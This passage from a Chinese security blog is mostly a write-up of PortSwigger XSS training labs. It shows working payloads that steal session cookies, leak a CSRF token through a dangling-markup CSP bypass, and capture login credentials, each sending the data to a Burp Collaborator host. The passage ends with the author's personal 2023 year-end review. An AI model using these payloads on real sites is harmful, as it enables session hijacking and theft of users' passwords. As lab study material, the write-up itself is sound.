data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201102959.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201102959.png"></a></p><p>不浪费时间了，查看 solution，其中给的 payload 如下，使用了 <code>fetch()</code> 发送请求（前天才看了 <code>fetch()</code> 咋没想起来呢！！ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123; </span></span><br><span class="line"><span class="language-javascript"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript"><span class="attr">body</span>:<span class="variable language_">document</span>.<span class="property">cookie</span> </span></span><br><span class="line"><span class="language-javascript">&#125;); </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>观察 Collaborator，cookie 信息在请求消息体中。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201104837.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201104837.png"></a></p><p>原来只是我没找对请求呀，上面那个是我自己触发的，发送的是我自己的 cookie，下面这个才是受害人触发的（裂开，自己的 cookie 是啥都不知道！！）</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201105054.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201105054.png"></a></p><p>使用插件 Cookie-Editor 或 F12 Application 修改 cookie 并刷新页面，提示 lab 解决。</p><p>访问下 <code>/my-account</code> ，成功进入管理员页面。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240201105533.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240201105533.png"></a></p><h1 id="23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><a href="#23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack" class="headerlink" title="23 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack"></a>23 Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Reflected XSS</a> protected by very strict <a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy">CSP</a>, with <a href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">dangling markup</a> attack</h1><p>描述：使用严格 CSP，反射型 XSS<br>目标：绕过 CSP，拿到受害人 CSRF token，并修改受害人邮箱为 <code>hacker@evil-user.net</code>。为了更好的模拟受害人点击，攻击向量中必须包含 “Click”。</p><p>抓包，修改邮箱请求的 api 为 <code>/my-account/change-email</code> 使用 POST 方法传递两个参数，分别是 <code>email</code> 和 <code>csrf</code> token，且特殊字符自动 URL 编码。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203201854.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203201854.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;;object-src &#x27;none&#x27;; style-src &#x27;self&#x27;; script-src &#x27;self&#x27;; img-src &#x27;self&#x27;; base-uri &#x27;none&#x27;;</span><br></pre></td></tr></table></figure><p><code>default-src &#39;self&#39;</code> 表示默认&#x2F;未说明时，仅允许加载同源资源。<code>object-src &#39;none&#39;;base-uri &#39;none&#39;;</code> 表示无法加载对象资源，如 <code>&lt;embed&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;applet&gt;</code>，也无法使用 <code>&lt;base&gt;</code> 修改 base uri。剩下的内容表示只能从该网页相同的源中加载样式、js 脚本、图片。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 以下尝试全是错的，可以不看 T_T &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>首先我们尝试 HTML 注入，看能不能注入一些可执行的 HTML 元素。</p><p>在前端注入，报错 “@” 前不能含特殊字符 “&lt;”, “&gt;”, “(“等。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203113.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203113.png"></a></p><p>使用 URL 编码后发送 <code>%3Cscript%3Ealert%281%29%3C%2Fscript%3E@qq.com</code>，发现输入内容中的 “%” 也被编码了，</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203202735.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203202735.png"></a></p><p>直接抓包修改 email，提示 302，点击 “Follo redirection” 响应成功跳转到用户主页。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203539.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203539.png"></a></p><p>邮箱回显出注入的 script 标签，但并未执行成功，不过也说明邮箱格式更多的是<strong>前端验证</strong>的。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203203743.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203203743.png"></a></p><p>但是 email 中仍需要包含 ‘@’ 符号。修改邮箱，不带 ‘@’ 符号，<code>email=&lt;script&gt;alert(3)&lt;/script&gt;&amp;csrf=0xjhIDpcJNHZsZiol5tEp4jjeB5wB34w</code>，发现邮箱未更改。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205015.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205015.png"></a></p><blockquote><p>[!question] 问题<br>这里未执行成功的原因是什么？</p><p><strong>答：</strong> 特殊符号 &gt;&lt;” 转换成了 HTML 实体。</p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203204654.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203204654.png"></a></p><p>构造 payload <code>&lt;img src=&#39;https://kc0uwm9v8xtvzi5jvv8vrfptikobc10q.oastify.com/?@qq.com</code></p><p>因为有空格，参数不好传，我就直接全都 url 编码了，工具仍是 <a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205308.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205308.png"></a></p><p>“&gt;&lt;” 被转换成 HTML 实体了呀，如何绕过呢？</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240203205827.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240203205827.png"></a></p><blockquote><p>[!question] 问题<br>如何绕过 HTML 实体编码？</p></blockquote><blockquote><p>[!question] 问题<br>这个注入点找的对吗，题目上说是 RXSS，通过修改邮箱注入，不就成存储型的了？<br>不过如果要使用 dangling-markup 攻击获取 csrf token 的话，好像也修改邮箱这里了，离得近。</p><p><strong>答：</strong> 找的并不对，看下面。</p></blockquote><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 以上尝试全是错的 T_T &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>原来是我注入点找错了，我还纳闷呢，哪有反射型 XSS 呢，原来搁这呢。url 中的参数会回显在 input 元素的 value 属性中。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205101848.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205101848.png"></a></p><p>本题的重点是绕过 CSP。</p><p>思路：</p><ol><li>使用 base 元素中的 target 属性设置超链接跳转行为，如果 target 是自定义的内容，超链接会默认跳转到一个新 tab，并设置 <code>window.name</code> 为 target 的值。也就是说如果我们使用未闭合的 target，如 <code>target=&#39;hello</code> 就可以将注入点到下一个 ‘ 之间的内容设置为 <code>window.name</code>。 具体参看：<a href="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup">Evading CSP with DOM-based dangling markup</a></li><li>注入一个 <code>&lt;a&gt;</code> 标签，超链接定义为攻击者的服务器（Burp Collaborator），将 <code>window.name</code> 发送过来，其中可能就有受害人的 csrf token 等敏感信息。</li><li>由于修改邮箱要用到用户 session，所以简单构造一个修改邮箱的报文不起作用。这里使用 CSRF 攻击伪造访问 <code>/my-account/change-email</code> 接口的请求，当用户点击时，就会将 email 连同 csrf token 发送到服务端，从而修改用户邮箱。</li></ol><blockquote><p>[!note]<br>通过 base 元素修改 window.name 好像 Google Chrome 不行，得用火狐浏览器。 </p></blockquote><p>上面那个<a href="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup">博客</a>中的 POC，在 Chrome 中无效，但在 Firefox 中正确弹出 <code>window.name</code>.</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105912.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105912.png"></a></p><p>谷歌：<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105829.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105829.png"></a><br>火狐：<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105813.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105813.png"></a><br>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">name</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//n4scmpf0j3enw70v6zn2q72980er2hq6.oastify.com?&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">     location = <span class="string">&#x27;https://0afd009f048818e68233ed2600c000f6.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0aeb009f040a18be8206ec3d01a800fe.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击 “View exploit” 看看效果。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205091711.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205091711.png"></a></p><p>因为刚开始 <code>window.name</code> 为空，所以设置 <code>location</code>，注入 <code>&lt;a&gt;</code> 标签，且包含一个未闭合的 base 标签的 target 属性。 </p><p>点击 “Click me” 会将 <code>window.name</code> 发送给 Collaborator，其中就有受害人的 csrf token。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105300.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105300.png"></a></p><p>解码。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105322.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105322.png"></a></p><blockquote><p>[!question] 问题<br>本地 view exploit 嘎嘎拿 csrf token，deliver exploit to victim 就不行了，受害人不会用的 Chrome 吧？</p></blockquote><h1 id="24-Lab-Exploiting-cross-site-scripting-to-capture-passwords"><a href="#24-Lab-Exploiting-cross-site-scripting-to-capture-passwords" class="headerlink" title="24 Lab: Exploiting cross-site scripting to capture passwords"></a>24 Lab: Exploiting cross-site scripting to capture passwords</h1><p>评论的内容部分即可注入。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205115211.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205115211.png"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>please input your passwords!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;https://5oujl1cedfln09yyy7nqkext6kcb01oq.oastify.com?pwd=&#x27;</span>+pwd;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这玩意儿老发一堆空值。</p><p>修改 payload，让 ChatGPT 给咱生成一个。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;loginForm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, sendDataWhenReady);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, sendDataWhenReady);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sendDataWhenReady</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// Check if both fields have values</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Use Fetch API to send the data</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://yacmzgegtcxk7vho6u5znwy6pxvoje73.oastify.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; username, password &#125;),</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Optionally, clear the form fields after sending the data</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;loginForm&#x27;</span>).<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205133010.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205133010.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205133033.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205133033.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;qy1dkc59nd0tr23syh3&quot;&#125;</span><br><span class="line">&#123;&quot;username&quot;:&quot;dministrator&quot;,&quot;password&quot;:&quot;y&quot;&#125;</span><br></pre></td></tr></table></figure><p>这是要让我排列组合？<code>&quot;username&quot;:&quot;administrator&quot;,&quot;password&quot;:&quot;yqy1dkc59nd0tr23syh3&quot;</code></p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 更新 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p><code>document.getElementById(&#39;loginForm&#39;).reset();</code> 我应该把这玩意删了的，一个劲给我发表单，不过如果删了，我是不是就拿不到用户名密码了，我也是排列组合的emmm.</p><p>好吧，监听器写的有问题，不如直接 <code>onchange</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/a.png" data-caption=""><img src="/images/2024/02/20/a.png"></a></p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 更新 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>下面给出官方 solution，蛮精简的。<code>username.value</code> 就能读取用户名？我还用了 <code>document.getElementById</code>，还用 <code>addEventListener</code> 监听输入行为，其实一个 <code>onchange</code> 就完事了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">method:&#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">mode: &#x27;no-cors&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">body:username.value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205134534.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205134534.png"></a></p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/xss/">xss</category>
      
      <category domain="https://by-musi.github.io/tags/writeup/">writeup</category>
      
      
      <comments>https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2023 年终总结</title>
      <link>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <guid>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Sat, 10 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>今天是大年初二，稍微更两篇文章吧。钢铁直男，文笔一般，大家将就着看哈。</p><p>我的 2023 是一部属于自己的冰与火之歌，也算是精彩纷呈。前半年，西安，本科僧，快乐划水，无忧无虑；后半年，北京，研究牲，打工人，always emo。 </p><p>这一年，我完成了毕业设计，离开了西安交大，来到北京邮电大学。这一年，我跟好哥们一起玩了好多好多游戏，一起去了惠州、广州、张家口，真是一场难忘的毕业旅行。这一年，我第一次坐飞机，第一次去南方城市，第一次见识到都市的繁华，也尝到了被大太阳撵着烤的滋味，肤色也深沉了几个度，还是北方的风适合不羁的我，（没说你嗷，北京）。这一年，我第一次来到北京，第一次离天安门这么近，认识了很多新的伙伴，也第一次进行了一个讪的搭。</p><p>那是我人生中第一次搭讪。搭讪之前，我以为我会认识一位女孩子，可结果却是认识了我自己。原来我这么不会聊天的嘛，原来我这么钢铁直男的嘛！（详情参见下方 尴尬语录）仔细一想，我好像是有这么一个弱点：心情好的时候，嘴巴就会止不住地哔哔叨。在我这里，多巴胺的任务好像不单单是愉悦心情，还会顺带攻击语言中枢，可我那点情商根本应对不了满嘴胡放炮的严峻形势，结果就是犯了聊天的大忌，常常在不经意间伤到别人。之后，我意识到毕业旅行的时候好像也因为这个说错了几次话，就在群里给哥几个道了个歉。那会可真是给我 emo 坏了，时不时琢磨一下最近说的话，哪些说错了，应该怎么说，甚至会不自觉带入当时的情景，然后用比较 “恰当” 方式进行处理。这玩意是不是叫 “精神分裂”？哈哈。</p><p>不过现在已经没事了，我开摆了。不得不说，躺平和开摆这哥俩在某些情况下还真是有一手，不会聊就不聊了呗。工作、健身、学习、挖洞，时间根本不够用，我恨不得把一天掰成两天过，社交就先靠边稍息一下。可我的倾诉欲还是有那么亿丢丢强的，咋办嘞？我不断寻找答案，直至无意间看到了这么一句话：写作就是自己与自己对话。我愿称之为年度最佳！自己跟自己聊天可不需要在意我是不是在玩烂梗，也不用管处理方式是否恰当，写的人是我，看的人大概率也是我，自己开心就完事了。转念一想，文章写都写了，为什么不发出来呢，如若能帮助到大家，我倍感荣幸。我是从互联网上学到的知识，理应无条件回馈给互联网。所以，我搭建了自己的博客，在网络世界也有了自己的一亩三分地。</p><p>现在搭博客可真是方便，也不用自己买服务器，github 建个库，自己再随便折腾一下，一个博客就诞生了。我的搭建方案是 hexo + cacuts 主题。一提到 cactus 我就一肚子委屈，好好的 next 主题不用，非得用 cactus，我真傻，真的（虽说这个主题在我审美上吧）。cactus 的作者奉行极简，所以这款主题啥也没有，有很多我不喜欢的小瑕疵。为了搭这个博客，我真是快把 cactus 的源码都看个底儿朝天了，从下图展示的部分 todo 就可见一斑。搭这个博客可是费了我老鼻子劲儿了，好像研究了整整两周，具体多久记不住了，只依稀记得那两天每天下班健完身就搞这破玩意。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/11/Pasted_image_20240210205204.png" data-caption=""><img src="/images/2024/02/11/Pasted_image_20240210205204.png"></a></p><p>欧克，博客搭建完了，现在就差文章了。我习惯使用 Obsidian 记录与写作，并且已经在库中写了很多东西了，可博客用的却是 hexo，二者虽然都记录在 markdown 文件中，但具体语法还是稍有不同。我还有个毛病就是忍受不了繁琐简单的工作。让我啥也不干就搁这改语法，我是一百个不愿意啊，而脚本恰恰可以完美解决这个问题 – 让繁琐的工作自动化。于是我又开始着手编写脚本。2023，我真是<strong>把“本末倒置”演绎到极致</strong>了，之前搭建博客是干啥来着？有 ChatGPT 的帮助，写个百十来行的小脚本并不是什么难事，但由于我没有理顺脚本的架构，写完的脚本目前只能修改语法、发布文章，还不能更新博客。我不是一个固执的人，但并不否认我确实有点完美主义。其实我已经写完很多文章了，但感觉还没到能发的程度，就一直被我捂着，发了之后，我可能就懒得改了，况且这破脚本还不允许我更新博客。以后工作项目组要是采用 “小步快跑，快速迭代” 的策略，我岂不是要难受死？</p><p>后面就一直跟着 PortSwigger 的教程学习 web 安全，已经做完七十来个 lab 啦，具体就不多说了。有意思的是，“newbie” 的中文意思是 “新手”，却跟 “牛逼” 同音，而从 “newbie” 到 “牛逼”，我还有很长的路要走。加油，菜同学！我要做自己的码头。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/11/Pasted_image_20240211083859.png" data-caption=""><img src="/images/2024/02/11/Pasted_image_20240211083859.png"></a></p><p><strong>我啥时候能挖到一个洞啊！！！</strong></p><p>聊点别的吧。来北京之前，我曾无数次幻想过北京的样子，但我是万万没想到会有这么个情况：中午时分，窗外大雪纷飞，我穿着老汉背心在工位上爬了一会，出了一身汗。这几个名词以一种很新的方式关联到一起，给我整不会了。北京室内室外温差咋这大呢，空调暖风 27 度，还没法调温度，让不让人好好工作啦！！写两行 Hello World 脑子就迷糊了。</p><p>我来了北京才知道，风是真的能用“呼啸”来形容！！西安就很少有这么大的风。这里说明一下，我并不是西安人，只是在西安求学，不过老家离西安也蛮近的，小时候，奶奶看天气预报就看西安的，哈哈，我这人跑步不行，跑题可是杠杠的。在北京骑车过十字路口，差点给我撂倒。北京大半夜不睡觉搁那呼呼吹口哨，把我都整失眠了。难道北京城也是个渣男？</p><p>好了，就酱紫吧，不能再聊了，聊出感情就坏了。</p><p>下面我细数了一下 2023 做的事，原来我还是干了点人事的呀，哈哈，大家挑着看就好了。</p><p>最后，新年快乐！！！！！！！！！！！！！！</p><h1 id="2023-就干了点这？"><a href="#2023-就干了点这？" class="headerlink" title="2023 就干了点这？"></a>2023 就干了点这？</h1><ol><li>搭建个人博客，<a href="https://by-musi.github.io/">https://by-musi.github.io/</a> 并进行了一些外观上的优化，还没整完，有点懒得搞了，太麻烦了，呜呜。发了三篇博客</li><li>CSDN 同步发一些文章，目前发了四篇，48个粉丝 ，其实就图一乐，顺便给个人博客引点流量。</li><li>读了一些论文。我现在其实并没有读论文的需求，大多时间都在学 web 或配合公司做反诈方面的工作，所以就看了这几篇，<strong>之后整理整理发博客？</strong> 后面 fuzz 的论文是做毕设的时候看的，很多都忘了<ol><li>Label-free Poisoning Attack against Deep Unsupervised Domain Adaptation</li><li>ZMap: Fast Internet-Wide Scanning and its Security Applications 没太看懂</li><li>prompt injection attack LLM-integrated Applications 提示词注入框架 – 后羿</li><li>The Art Science and Engineering of Fuzzing</li><li>CarpetFuzz: Automatic Program Option Constraint Extraction from Documentation for Fuzzing</li><li>Skyfire: Data-Driven Seed Generation for Fuzzing</li><li>IOTFUZZER : Discovering Memory Corruptions in IoT Through App-based Fuzzing</li><li>Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference</li><li>HowtoReadaPaper 就四页，其实不算一个 paper</li></ol></li><li>完成毕业设计，优化 Snipuzz，研究了源码，优化得依托答辩，哈哈，不过还是掌握了 fuzz 